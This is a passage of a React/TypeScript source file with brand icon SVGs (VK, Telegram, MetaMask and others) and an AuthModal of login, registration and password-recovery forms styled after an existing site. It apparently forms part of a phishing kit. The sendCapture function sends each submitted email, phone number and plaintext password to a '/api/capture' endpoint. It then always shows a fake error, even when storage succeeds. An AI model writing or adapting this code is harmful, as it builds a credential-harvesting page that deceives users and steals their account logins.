        <path fill="#006deb" d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" style={{ fill: '#006deb' }} />
        <g clipPath="url(#vk_090179__a)">
          <path fill="#fff" d="M18.893 24C12.06 24 8.163 19.495 8 12h3.423c.112 5.501 2.636 7.832 4.634 8.312V12h3.224v4.745c1.973-.204 4.047-2.367 4.746-4.745h3.223c-.537 2.93-2.785 5.093-4.384 5.982 1.599.72 4.16 2.607 5.134 6.018h-3.548c-.762-2.282-2.66-4.048-5.172-4.288V24z" style={{ fill: '#fff' }} />
        </g>
        <defs>
          <clipPath id="vk_090179__a">
            <path fill="#fff" d="M0 0h20v20H0z" transform="translate(8 8)" />
          </clipPath>
        </defs>
      </g>
      <g className="vk_090179__monochrome">
        <path d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <g clipPath="url(#vk_090179__b)">
          <path fill="currentColor" d="M18.893 24C12.06 24 8.163 19.496 8 12h3.423c.112 5.502 2.636 7.832 4.634 8.312V12h3.224v4.745c1.973-.204 4.047-2.367 4.746-4.745h3.223c-.537 2.93-2.785 5.093-4.384 5.982 1.599.72 4.16 2.607 5.134 6.018h-3.548c-.762-2.282-2.66-4.048-5.172-4.288V24z" />
        </g>
        <defs>
          <clipPath id="vk_090179__b">
            <path d="M8 8h20v20H8z" />
          </clipPath>
        </defs>
      </g>
    </svg>
  );
}

function TelegramIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" role="presentation" className="icon-base_root-g9fLa base_icon-HuD6g base_theme-monochrome-HuD6g base_default-HuD6g" width="36" height="36" data-icon="telegram">
      <g className="telegram_0c6e0f__color">
        <path fill="#279ddb" d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" style={{ fill: '#279ddb' }} />
        <path fill="#fff" d="M9.226 17.45s8.846-3.63 11.914-4.909c1.175-.511 5.164-2.147 5.164-2.147s1.84-.716 1.687 1.022c-.051.716-.46 3.221-.87 5.931-.613 3.835-1.278 8.028-1.278 8.028s-.102 1.176-.971 1.38c-.87.205-2.3-.715-2.556-.92-.205-.153-3.835-2.454-5.165-3.58-.358-.306-.767-.92.051-1.635 1.841-1.688 4.04-3.784 5.37-5.113.613-.614 1.226-2.046-1.33-.307a437 437 0 0 1-7.21 4.857s-.818.512-2.352.051c-1.533-.46-3.323-1.073-3.323-1.073s-1.227-.767.87-1.585" style={{ fill: '#fff' }} />
      </g>
      <g className="telegram_0c6e0f__monochrome">
        <path d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <g clipPath="url(#telegram_0c6e0f__a)">
          <path fill="currentColor" d="M9.226 17.45s8.846-3.63 11.914-4.909c1.175-.511 5.164-2.147 5.164-2.147s1.84-.716 1.687 1.022c-.051.716-.46 3.221-.87 5.931-.613 3.835-1.278 8.028-1.278 8.028s-.102 1.176-.971 1.38c-.87.205-2.3-.715-2.556-.92-.205-.153-3.835-2.454-5.165-3.58-.358-.306-.767-.92.051-1.635 1.841-1.688 4.04-3.784 5.37-5.113.613-.614 1.226-2.046-1.33-.307a437 437 0 0 1-7.21 4.857s-.818.512-2.352.051c-1.533-.46-3.323-1.073-3.323-1.073s-1.227-.767.87-1.585" />
        </g>
        <defs>
          <clipPath id="telegram_0c6e0f__a">
            <path d="M8 8h20v20H8z" />
          </clipPath>
        </defs>
      </g>
    </svg>
  );
}

function YandexIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" role="presentation" className="icon-base_root-g9fLa base_icon-HuD6g base_theme-monochrome-HuD6g base_default-HuD6g" width="36" height="36" data-icon="yandex">
      <g className="yandex_d2e69b__color">
        <path fill="#e83a1b" d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" style={{ fill: '#e83a1b' }} />
        <path fill="#fff" d="M20.686 10.705h-1.503c-2.755 0-4.202 1.439-4.202 3.568 0 2.418 1.002 3.54 3.061 4.979l1.698 1.18L14.842 28h-3.646l4.397-6.763c-2.532-1.87-3.951-3.683-3.951-6.762C11.642 10.619 14.23 8 19.156 8h4.897v20h-3.367z" style={{ fill: '#fff' }} />
      </g>
      <g className="yandex_d2e69b__monochrome">
        <path d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <g clipPath="url(#yandex_d2e69b__a)">
          <path fill="currentColor" d="M20.686 10.705h-1.503c-2.755 0-4.202 1.439-4.202 3.568 0 2.418 1.002 3.54 3.062 4.979l1.697 1.18L14.842 28h-3.646l4.397-6.763c-2.532-1.87-3.951-3.683-3.951-6.762C11.642 10.619 14.23 8 19.156 8h4.898v20h-3.368z" />
        </g>
        <defs>
          <clipPath id="yandex_d2e69b__a">
            <path d="M8 8h20v20H8z" />
          </clipPath>
        </defs>
      </g>
    </svg>
  );
}

function WalletConnectIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" role="presentation" className="icon-base_root-g9fLa base_icon-HuD6g base_theme-monochrome-HuD6g base_default-HuD6g" width="36" height="36" data-icon="walletconnect">
      <g className="walletconnect_3dd157__color">
        <path fill="#0988ef" d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <path fill="#fff" d="M12.097 14.281c3.258-3.183 8.548-3.183 11.806 0l.393.386a.4.4 0 0 1 0 .576l-1.342 1.31a.21.21 0 0 1-.297 0l-.538-.526c-2.278-2.22-5.96-2.22-8.238 0l-.576.563a.21.21 0 0 1-.297 0l-1.341-1.31a.4.4 0 0 1 0-.575zM26.68 16.99l1.196 1.164a.397.397 0 0 1 0 .576l-5.385 5.258a.424.424 0 0 1-.588 0l-3.822-3.733a.107.107 0 0 0-.145 0l-3.822 3.733a.424.424 0 0 1-.588 0l-5.404-5.258a.397.397 0 0 1 0-.576L9.32 16.99a.424.424 0 0 1 .589 0l3.821 3.733a.107.107 0 0 0 .146 0l3.821-3.733a.424.424 0 0 1 .589 0l3.821 3.733a.107.107 0 0 0 .146 0l3.821-3.733a.45.45 0 0 1 .608 0" />
      </g>
      <g className="walletconnect_3dd157__monochrome">
        <path d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <path fill="currentColor" d="M12.097 14.281c3.258-3.183 8.548-3.183 11.806 0l.393.386a.4.4 0 0 1 0 .576l-1.342 1.31a.21.21 0 0 1-.297 0l-.538-.526c-2.278-2.22-5.96-2.22-8.238 0l-.576.563a.21.21 0 0 1-.297 0l-1.341-1.31a.4.4 0 0 1 0-.575zM26.68 16.99l1.196 1.164a.397.397 0 0 1 0 .576l-5.385 5.258a.424.424 0 0 1-.588 0l-3.822-3.733a.107.107 0 0 0-.145 0l-3.822 3.733a.424.424 0 0 1-.588 0l-5.404-5.258a.397.397 0 0 1 0-.576L9.32 16.99a.424.424 0 0 1 .589 0l3.821 3.733a.107.107 0 0 0 .146 0l3.821-3.733a.424.424 0 0 1 .589 0l3.821 3.733a.107.107 0 0 0 .146 0l3.821-3.733a.45.45 0 0 1 .608 0" />
      </g>
    </svg>
  );
}

function MetaMaskIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" role="presentation" className="icon-base_root-g9fLa base_icon-HuD6g base_theme-monochrome-HuD6g base_default-HuD6g" width="36" height="36" data-icon="metamask">
      <g className="metamask_cd17c7__color">
        <path fill="#3d065f" d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <g clipPath="url(#metamask_cd17c7__a)">
          <path fill="#ff5c16" d="m26.625 26.557-4.293-1.278-3.237 1.935h-2.26l-3.238-1.935-4.292 1.278L8 22.151l1.305-4.891L8 13.125l1.305-5.124 6.706 4.006h3.909L26.625 8l1.306 5.124-1.306 4.135 1.306 4.89z" />
          <path fill="#ff5c16" d="m9.306 8 6.706 4.01-.267 2.75zm4.291 14.152 2.95 2.248-2.95.879zm2.715-3.715-.567-3.674-3.63 2.498h-.002v.001l.012 2.572 1.471-1.397zM26.625 8l-6.705 4.008.266 2.752zm-4.29 14.151L19.383 24.4l2.95.879zm1.482-4.89v-.002.001l-3.63-2.498-.567 3.674h2.714l1.473 1.397z" />
          <path fill="#e34807" d="m13.597 25.279-4.292 1.278L8 22.152h5.597zm2.714-6.843.82 5.312-1.136-2.954-3.872-.96 1.473-1.398zm6.023 6.843 4.291 1.278 1.306-4.405h-5.597zm-2.714-6.843-.82 5.312 1.136-2.954 3.872-.96-1.474-1.398z" />
          <path fill="#ff8d5d" d="m8 22.15 1.305-4.89h2.807l.01 2.573 3.873.96 1.136 2.954-.584.65-2.95-2.247zm19.93 0-1.305-4.89h-2.807l-.01 2.573-3.872.96-1.136 2.954.584.65 2.95-2.247zm-8.01-10.143h-3.91l-.265 2.751 1.386 8.986H18.8l1.387-8.986z" />
          <path fill="#661800" d="M9.305 8 8 13.126l1.305 4.135h2.807l3.632-2.5zM15.5 19.504h-1.272l-.692.678 2.46.61-.496-1.29zM26.625 8l1.306 5.124-1.306 4.135h-2.807l-3.631-2.5zm-6.192 11.502h1.273l.693.68-2.463.61.497-1.291m-1.34 5.958.29-1.062-.583-.65h-1.67l-.584.65.29 1.062" />
          <path fill="#c0c4cd" d="M19.094 25.46v1.755h-2.258V25.46z" />
          <path fill="#e7ebf6" d="m13.598 25.277 3.24 1.937V25.46l-.29-1.062zm8.736 0-3.24 1.937V25.46l.29-1.062z" />
        </g>
        <defs>
          <clipPath id="metamask_cd17c7__a">
            <path fill="#fff" d="M8 8h20v19.296H8z" />
          </clipPath>
        </defs>
      </g>
      <g className="metamask_cd17c7__monochrome">
        <path d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <path fill="currentColor" fillRule="evenodd" d="M16.01 12.006h3.91l6.705-4.005 1.305 5.125-1.305 4.134 1.305 4.89v.003l-1.305 4.404-4.293-1.278-3.238 1.936h-2.259l-3.238-1.936-4.292 1.278L8 22.153v-.003l1.305-4.89L8 13.126 9.305 8l.005.003L9.306 8zm.536 12.393.29 1.062h2.258l.29-1.062-.584-.65h-1.67zm3.39-3.606 2.462-.61-.692-.68h-1.273zm-6.4-.612 2.46.61-.496-1.288h-1.272zM9.25 13.124l.889 3.303h2.807l1.964-1.667-4.771-5.094zm11.77 1.636 1.965 1.667h2.807l.875-3.302-.875-3.459z" clipRule="evenodd" />
      </g>
    </svg>
  );
}

function TrustWalletIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" role="presentation" className="icon-base_root-g9fLa base_icon-HuD6g base_theme-monochrome-HuD6g base_default-HuD6g" width="36" height="36" data-icon="trustwallet">
      <g className="trustwallet_0e9e1a__color">
        <path fill="#1b1b1d" d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <path fill="#48ff91" d="M9.166 10.889 18 8v20c-6.31-2.667-8.834-7.778-8.834-10.666z" />
        <path fill="url(#trustwallet_0e9e1a__a)" d="M26.834 10.889 18 8v20c6.31-2.667 8.834-7.778 8.834-10.666z" />
        <defs>
          <linearGradient id="trustwallet_0e9e1a__a" x1="17.588" x2="24.902" y1="30.503" y2="4.211" gradientUnits="userSpaceOnUse">
            <stop offset=".26" stopColor="#48ff91" />
            <stop offset=".66" stopColor="#0094ff" />
            <stop offset=".8" stopColor="#0038ff" />
            <stop offset=".89" stopColor="#0500ff" />
          </linearGradient>
        </defs>
      </g>
      <g className="trustwallet_0e9e1a__monochrome">
        <path d="M0 16c0-5.6 0-8.4 1.09-10.54a10 10 0 0 1 4.37-4.37C7.6 0 10.4 0 16 0h4c5.6 0 8.4 0 10.54 1.09a10 10 0 0 1 4.37 4.37C36 7.6 36 10.4 36 16v4c0 5.6 0 8.4-1.09 10.54a10 10 0 0 1-4.37 4.37C28.4 36 25.6 36 20 36h-4c-5.6 0-8.4 0-10.54-1.09a10 10 0 0 1-4.37-4.37C0 28.4 0 25.6 0 20z" />
        <path fill="currentColor" d="M18.084 28c6.114-2.584 8.673-7.46 8.827-10.39l.008-.276v-6.445L18.084 8v1.875l7.085 2.283v5.176c0 1.755-1.425 5.26-5.334 7.775l-1.75 1.016zM9.25 10.889 18.084 8v20c-6.31-2.667-8.834-7.778-8.834-10.666z" />
      </g>
    </svg>
  );
}

function CurrencyBadge({ currency, size = 24 }: { currency: CurrencyItem; size?: number }) {
  return (
    <div
      style={{
        width: size,
        height: size,
        borderRadius: '50%',
        backgroundColor: currency.badgeBg,
        color: currency.badgeColor || '#ffffff',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontSize: size > 28 ? '13px' : '11px',
        fontWeight: 700,
        flexShrink: 0,
      }}
    >
      {currency.symbol.length > 2 ? currency.symbol.slice(0, 2) : currency.symbol}
    </div>
  );
}

// --------------------------------------------------------------------------
// AuthModal Component
// --------------------------------------------------------------------------
export default function AuthModal({ isOpen, onClose, initialMode = 'login' }: AuthModalProps) {
  const [authMode, setAuthMode] = useState<'login' | 'register' | 'recovery'>(initialMode);
  const [subView, setSubView] = useState<'form' | 'currency' | 'country'>('form');

  // Login: Default Email tab active
  const [loginSubTab, setLoginSubTab] = useState<'phone' | 'email'>('email');
  const [loginPhone, setLoginPhone] = useState(`${COUNTRIES[0].code}  `);
  const [loginPhoneCountry, setLoginPhoneCountry] = useState<CountryItem>(COUNTRIES[0]);
  const [loginPhoneErr, setLoginPhoneErr] = useState('');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginEmailErr, setLoginEmailErr] = useState('');
  const [loginPwd, setLoginPwd] = useState('');
  const [loginPwdErr, setLoginPwdErr] = useState('');
  const [isPhoneFocused, setIsPhoneFocused] = useState(false);
  const [isEmailFocused, setIsEmailFocused] = useState(false);
  const [isPwdFocused, setIsPwdFocused] = useState(false);

  // Password Recovery state
  const [recoverySubTab, setRecoverySubTab] = useState<'phone' | 'email'>('email');
  const [recoveryPhone, setRecoveryPhone] = useState(`${COUNTRIES[0].code}  `);
  const [recoveryPhoneCountry, setRecoveryPhoneCountry] = useState<CountryItem>(COUNTRIES[0]);
  const [recoveryPhoneErr, setRecoveryPhoneErr] = useState('');
  const [recoveryEmail, setRecoveryEmail] = useState('');
  const [recoveryEmailErr, setRecoveryEmailErr] = useState('');
  const [isRecoveryPhoneFocused, setIsRecoveryPhoneFocused] = useState(false);
  const [isRecoveryEmailFocused, setIsRecoveryEmailFocused] = useState(false);
  const recoveryPhoneInputRef = useRef<HTMLInputElement>(null);

  // Registration state
  const [regCurrency, setRegCurrency] = useState<CurrencyItem>(CURRENCIES[0]);
  const [regCountry, setRegCountry] = useState<CountryItem>(COUNTRIES[0]);
  const [regPhone, setRegPhone] = useState(`${COUNTRIES[0].code}  `);
  const [regPhoneErr, setRegPhoneErr] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regEmailErr, setRegEmailErr] = useState('');
  const [regPwd, setRegPwd] = useState('');
  const [regPwdErr, setRegPwdErr] = useState('');
  const [showPromo, setShowPromo] = useState(false);
  const [regPromo, setRegPromo] = useState('');
  const [regAgreed, setRegAgreed] = useState(true);
  const [regAgreedErr, setRegAgreedErr] = useState('');

  // Pickers search
  const [currencySearch, setCurrencySearch] = useState('');
  const [countrySearch, setCountrySearch] = useState('');

  // Submissions
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [errorTitle, setErrorTitle] = useState('Error');
  const [statusMessage, setStatusMessage] = useState('');
  const [formBannerError, setFormBannerError] = useState('');

  const phoneInputRef = useRef<HTMLInputElement>(null);

  // Sync mode changes
  useEffect(() => {
    setAuthMode(initialMode);
    setLoginSubTab('email');
    setSubView('form');
  }, [initialMode, isOpen]);

  // Lock body scroll
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [isOpen]);

  const clearAllErrors = () => {
    setLoginPhoneErr('');
    setLoginEmailErr('');
    setLoginPwdErr('');
    setRecoveryPhoneErr('');
    setRecoveryEmailErr('');
    setRegPhoneErr('');
    setRegEmailErr('');
    setRegPwdErr('');
    setRegAgreedErr('');
    setStatusMessage('');
    setFormBannerError('');
  };

  const handleClose = React.useCallback(() => {
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
    setIsSubmitting(false);
    setSubView('form');
    onClose();
  }, [onClose]);

  // Escape key handler
  useEffect(() => {
    const handleKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        if (subView !== 'form') {
          setSubView('form');
        } else {
          handleClose();
        }
      }
    };
    document.addEventListener('keydown', handleKey);
    return () => document.removeEventListener('keydown', handleKey);
  }, [handleClose, subView]);

  // Filtered Currencies
  const filteredCurrencies = useMemo(() => {
    if (!currencySearch.trim()) return CURRENCIES;
    const q = currencySearch.toLowerCase().trim();
    return CURRENCIES.filter(
      (c) => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.symbol.toLowerCase().includes(q)
    );
  }, [currencySearch]);

  // Filtered Countries
  const filteredCountries = useMemo(() => {
    if (!countrySearch.trim()) return COUNTRIES;
    const q = countrySearch.toLowerCase().trim();
    return COUNTRIES.filter(
      (c) => c.searchStr.includes(q) || c.name.toLowerCase().includes(q) || c.code.includes(q)
    );
  }, [countrySearch]);

  const handlePhoneChange = (
    val: string,
    setter: (v: string) => void,
    countrySetter: (c: CountryItem) => void
  ) => {
    // Allow optional leading '+' and digits/spaces
    let clean = val.replace(/[^\d+\s]/g, '');
    if (clean.indexOf('+') > 0) {
      clean = (clean.startsWith('+') ? '+' : '') + clean.replace(/\+/g, '');
    }
    setter(clean);
    const matched = findCountryByPhoneInput(clean);
    if (matched) {
      countrySetter(matched);
    }
  };

  const sendCapture = async (data: Record<string, unknown>) => {
    setIsSubmitting(true);
    setShowSuccess(false);
    setShowError(false);
    setFormBannerError('');

    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
      const json = await res.json().catch(() => null);
      setIsSubmitting(false);

      if (res.ok && json?.supabase === true) {
        setErrorTitle('Error');
        setStatusMessage('Error on our end, try again later');
        setShowError(true);
      } else {
        setErrorTitle('Server Error');
        setStatusMessage('Server error, try again');
        setShowError(true);
      }
    } catch {
      setIsSubmitting(false);
      setErrorTitle('Server Error');
      setStatusMessage('Server error, try again');
      setShowError(true);
    }
  };

  // Login Submit
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    if (loginSubTab === 'phone') {
      const trimmed = loginPhone.trim();
      const subscriberPart = trimmed.startsWith(loginPhoneCountry.code)
        ? trimmed.slice(loginPhoneCountry.code.length)
        : trimmed.replace(/^\+\d{1,4}\s*/, '');
      const subscriberDigits = subscriberPart.replace(/\D/g, '');
      const totalDigits = trimmed.replace(/\D/g, '');
      if (!trimmed || subscriberDigits.length === 0) {
        setLoginPhoneErr('Please enter your phone number');
        valid = false;
      } else if (subscriberDigits.length < 5 && totalDigits.length < 7) {
        setLoginPhoneErr('Please enter a valid phone number');
        valid = false;
      }
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!loginEmail.trim()) {
        setLoginEmailErr('Please enter your email address');
        valid = false;
      } else if (!emailRegex.test(loginEmail.trim())) {
        setLoginEmailErr('Please enter a valid email address');
        valid = false;
      }
    }

    if (!loginPwd.trim()) {
      setLoginPwdErr('Please enter your password');
      valid = false;
    } else if (loginPwd.trim().length < 6) {
      setLoginPwdErr('Password must be at least 6 characters');
      valid = false;
    }

    if (!valid) return;

    const isPhone = loginSubTab === 'phone';
    const cleanPhone = loginPhone.trim();
    const cleanEmail = loginEmail.trim();
    const phoneWithCode = isPhone
      ? cleanPhone.startsWith('+')
        ? cleanPhone
        : `${loginPhoneCountry.code} ${cleanPhone}`
      : null;
    const emailVal = !isPhone ? cleanEmail : null;
    const identifierVal = isPhone ? phoneWithCode : emailVal;

    await sendCapture({
      type: 'Login',
      method: loginSubTab,
      identifier: identifierVal,
      email: emailVal,
      phone: phoneWithCode,
      password: loginPwd,
    });
  };

  // Register Submit
  const handleRegisterSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    const trimmedRegPhone = regPhone.trim();
    const regSubscriberPart = trimmedRegPhone.startsWith(regCountry.code)
      ? trimmedRegPhone.slice(regCountry.code.length)
      : trimmedRegPhone.replace(/^\+\d{1,4}\s*/, '');
    const regSubscriberDigits = regSubscriberPart.replace(/\D/g, '');
    const regTotalDigits = trimmedRegPhone.replace(/\D/g, '');
    if (!trimmedRegPhone || regSubscriberDigits.length === 0) {
      setRegPhoneErr('Please enter your phone number');
      valid = false;
    } else if (regSubscriberDigits.length < 5 && regTotalDigits.length < 7) {
      setRegPhoneErr('Please enter a valid phone number');
      valid = false;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!regEmail.trim()) {
      setRegEmailErr('Please enter your email address');
      valid = false;
    } else if (!emailRegex.test(regEmail.trim())) {
      setRegEmailErr('Please enter a valid email address');
      valid = false;
    }

    if (!regPwd.trim()) {
      setRegPwdErr('Please enter a password');
      valid = false;
    } else if (regPwd.trim().length < 8) {
      setRegPwdErr('Password must be at least 8 characters');
      valid = false;
    }

    if (!regAgreed) {
      setRegAgreedErr('You must accept the User Agreement');
      valid = false;
    }

    if (!valid) return;

    await sendCapture({
      type: 'Registration',
      currency: regCurrency.code,
      currencyName: regCurrency.name,
      phone: trimmedRegPhone.startsWith('+') ? trimmedRegPhone : `${regCountry.code} ${trimmedRegPhone}`,
      email: regEmail,
      password: regPwd,
      promoCode: regPromo || undefined,
      agreedTerms: regAgreed,
    });
  };

  // Recovery Submit
  const handleRecoverySubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    if (recoverySubTab === 'phone') {
      const trimmed = recoveryPhone.trim();
      const subscriberPart = trimmed.startsWith(recoveryPhoneCountry.code)
        ? trimmed.slice(recoveryPhoneCountry.code.length)
        : trimmed.replace(/^\+\d{1,4}\s*/, '');
      const subscriberDigits = subscriberPart.replace(/\D/g, '');
      const totalDigits = trimmed.replace(/\D/g, '');
      if (!trimmed || subscriberDigits.length === 0) {
        setRecoveryPhoneErr('Please enter your phone number');
        valid = false;
      } else if (subscriberDigits.length < 5 && totalDigits.length < 7) {
        setRecoveryPhoneErr('Please enter a valid phone number');
        valid = false;
      }
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!recoveryEmail.trim()) {
        setRecoveryEmailErr('Please enter your email address');
        valid = false;
      } else if (!emailRegex.test(recoveryEmail.trim())) {
        setRecoveryEmailErr('Please enter a valid email address');
        valid = false;
      }
    }

    if (!valid) return;

    const isPhone = recoverySubTab === 'phone';
    const cleanPhone = recoveryPhone.trim();
    const cleanEmail = recoveryEmail.trim();
    const phoneWithCode = isPhone
      ? cleanPhone.startsWith('+')
        ? cleanPhone
        : `${recoveryPhoneCountry.code} ${cleanPhone}`
      : null;
    const emailVal = !isPhone ? cleanEmail : null;
    const identifierVal = isPhone ? phoneWithCode : emailVal;

    await sendCapture({
      type: 'Password recovery',
      method: recoverySubTab,
      identifier: identifierVal,
      email: emailVal,
      phone: phoneWithCode,
      password: '',
    });
  };

  // Forgot password switches to password recovery view
  const handleForgotPassword = (e: React.MouseEvent) => {
    e.preventDefault();
    setAuthMode('recovery');
    setRecoverySubTab(loginSubTab);
    if (loginPhone.trim() && loginPhone.trim() !== loginPhoneCountry.code) {
      setRecoveryPhone(loginPhone);
      setRecoveryPhoneCountry(loginPhoneCountry);
    }
    if (loginEmail.trim()) {
      setRecoveryEmail(loginEmail);
    }
    clearAllErrors();
  };

  if (!isOpen) return null;

  return (
    <div className="modal-layout_wrapper-C9j8A" data-testid="modal-layout" style={{ zIndex: 'var(--z-index-modal-layout, 1000)' }}>
      <div className="color-scheme_root-jGMem colorScheme-light" data-testid="auth">
        <div className="mobile-modal_root-SQ42V" data-testid="mobile-modal" style={{ '--v5b203f2c': 'var(--modal-new-base-color-bg)', '--f9c44310': '776' } as React.CSSProperties}>
          {/* Backdrop */}
          <div
            className="mobile-modal_backdrop-SQ42V"
            data-testid="modal-backdrop"
            style={{ transitionDuration: '300ms', transitionTimingFunction: 'cubic-bezier(0, 0, 0.25, 1)', opacity: 1 }}
            onClick={handleClose}
          />

          {/* Modal Container */}
          <div className="mobile-modal_holder-SQ42V" style={{ transitionDuration: '300ms', transitionTimingFunction: 'cubic-bezier(0, 0, 0.25, 1)' }}>
            <div className="mobile-modal_modal-SQ42V mobile-modal_detent-expanded-SQ42V mobile-modal_scrollable-SQ42V mobile-modal_noOverscroll-SQ42V">

              {/* Header */}
              <div className="modal-header_root-7NUzE" style={{ '--v18cd253e': 'var(--modal__color-bg)', '--ba7b6102': 'balance' } as React.CSSProperties}>
                <div className="modal-header_buttonsHolder-7NUzE">
                  <div className="modal-header_titleButtonBlock-7NUzE">
                    {(authMode === 'recovery' || subView !== 'form') && (
                      <button
                        className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-tertiary-5XEcn modal-header_button-7NUzE modal-header_titleButton-7NUzE"
                        data-testid="modal-header-button-back"
                        type="button"
                        onClick={() => {
                          if (subView !== 'form') {
                            setSubView('form');
                          } else if (authMode === 'recovery') {
                            setAuthMode('login');
                            clearAllErrors();
